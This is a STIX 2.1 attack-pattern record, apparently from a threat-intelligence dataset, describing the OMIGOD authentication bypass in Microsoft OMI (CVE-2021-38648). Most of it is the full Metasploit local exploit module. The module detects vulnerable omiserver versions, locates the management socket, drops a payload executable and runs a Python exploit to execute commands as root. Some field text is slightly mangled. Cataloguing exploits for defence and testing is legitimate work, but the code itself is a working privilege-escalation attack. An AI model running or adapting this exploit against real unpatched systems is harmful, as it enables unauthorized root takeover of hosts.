{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f456078-ffb1-4ce4-a17d-36ec88a59b1c",
    "created": "2024-08-14T16:59:06.475178Z",
    "modified": "2024-08-14T16:59:06.475182Z",
    "name": "Microsoft OMI Management Interface Authentication Bypass",
    "description": " By removing the authentication exchange, an attacker can issue requests to the local OMI management socket that will cause it to execute an operating system command as the root user. This vulnerability was patched in OMI version 1.6.8-1 (released September 8th 2021).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2021_38648_omigod.rb",
            "external_id": "cve_2021_38648_omigod.rb"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38648"
        },
        {
            "source_name": "reference",
            "url": "https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Process\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  DEFAULT_SERVER_BIN_PATH = '/opt/omi/bin/omiserver'.freeze\n  DEFAULT_SOCKET_PATH = '/var/opt/omi/run/omiserver.sock'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft OMI Management Interface Authentication Bypass',\n        'Description' => %q{\n          By removing the authentication exchange, an attacker can issue requests to the local OMI management socket\n          that will cause it to execute an operating system command as the root user. This vulnerability was patched in\n          OMI version 1.6.8-1 (released September 8th 2021).\n        },\n        'References' => [\n          ['CVE', '2021-38648'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38648'],\n          ['URL', 'https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure'],\n          ['URL', 'https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647']\n        ],\n        'Author' => [\n          'Nir Ohfeld', # vulnerability discovery & research\n          'Shir Tamari', # vulnerability discovery & research\n          'Spencer McIntyre' # metasploit module\n        ],\n        'DisclosureDate' => '2021-09-14',\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => { 'DisableNops' => true, 'Space' => 256 }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'AKA' => ['OMIGOD'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_advanced_options([\n      OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ]),\n      OptString.new('SocketPath', [ false, 'The path to the OMI server socket.', '' ])\n    ])\n  end\n\n  def check\n    pid = pidof('omiserver').first\n    return CheckCode::Safe('The omiserver process was not found.') if pid.nil?\n\n    omiserver_bin = read_file(\"/proc/#{pid}/cmdline\").split(\"\\x00\", 2).first\n    omiserver_bin = DEFAULT_SERVER_BIN_PATH if omiserver_bin.blank? && file?(DEFAULT_SERVER_BIN_PATH)\n    return CheckCode::Unknown('Failed to find the omiserver binary path.') if omiserver_bin.blank?\n\n    vprint_status(\"Found #{omiserver_bin} running in PID: #{pid}\")\n    if cmd_exec(\"#{omiserver_bin} --version\") =~ /\\sOMI-(\\d+(\\.\\d+){2,3}(-\\d+)?)\\s/\n      version = Regexp.last_match(1)\n    else\n      return CheckCode::Unknown('Failed to identify the version of the omiserver binary.')\n    end\n\n    return CheckCode::Safe(\"Version #{version} is not affected.\") if Rex::Version.new(version) > Rex::Version.new('1.6.8-0')\n\n    CheckCode::Appears(\"Version #{version} is affected.\")\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n  ensure\n    register_file_for_cleanup(path)\n  end\n\n  def find_exec_program\n    %w[python python3 python2].select(&method(:command_exists?)).first\n  end\n\n  def get_socket_path\n    socket_path = datastore['SocketPath']\n    return socket_path unless socket_path.blank?\n\n    pid = pidof('omiserver').first\n    fail_with(Failure::NotFound, 'The omiserver pid was not found.') if pid.nil?\n\n    if read_file(\"/proc/#{pid}/net/unix\") =~ %r{\\s(/(\\S+)server\\.sock)$}\n      socket_path = Regexp.last_match(1)\n    else\n      begin\n        socket_path = DEFAULT_SOCKET_PATH if stat(DEFAULT_SOCKET_PATH).socket?\n      rescue StandardError # rubocop:disable Lint/SuppressedException\n      end\n    end\n\n    fail_with(Failure::NotFound, 'The socket path could not be found.') if socket_path.blank?\n\n    vprint_status(\"Socket path: #{socket_path}\")\n    socket_path\n  end\n\n  def exploit\n    python_binary = find_exec_program\n    fail_with(Failure::NotFound, 'The python binary was not found.') unless python_binary\n\n    vprint_status(\"Using '#{python_binary}' to run the exploit\")\n    socket_path = get_socket_path\n    path = datastore['WritableDir']\n    python_script = rand_text_alphanumeric(5..10) + '.py'\n\n    case target['Type']\n    when :unix_cmd\n      root_cmd = payload.encoded\n    when :linux_dropper\n      unless path.start_with?('/')\n        # the command will be executed from a different working directory so use an absolute path\n        fail_with(Failure::BadConfig, 'The payload path must be an absolute path.')\n      end\n\n      payload_path = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n      if payload_path.length > 256\n        # the Python exploit uses a hard-coded exchange that only allows up to 256 characters to be included in the\n        # command that is executed\n        fail_with(Failure::BadConfig, 'The payload path is too long (>256 characters).')\n      end\n\n      upload(payload_path, generate_payload_exe)\n      cmd_exec(\"chmod +x '#{payload_path}'\")\n      root_cmd = payload_path\n    end\n\n    upload(\"#{path}/#{python_script}\", exploit_data('CVE-2021-38648', 'cve_2021_38648.py'))\n    cmd = \"#{python_binary} #{path}/#{python_script} -s '#{socket_path}' '#{root_cmd}'\"\n    vprint_status(\"Running #{cmd}\")\n    output = cmd_exec(cmd)\n    vprint_line(output) unless output.blank?\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-09-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}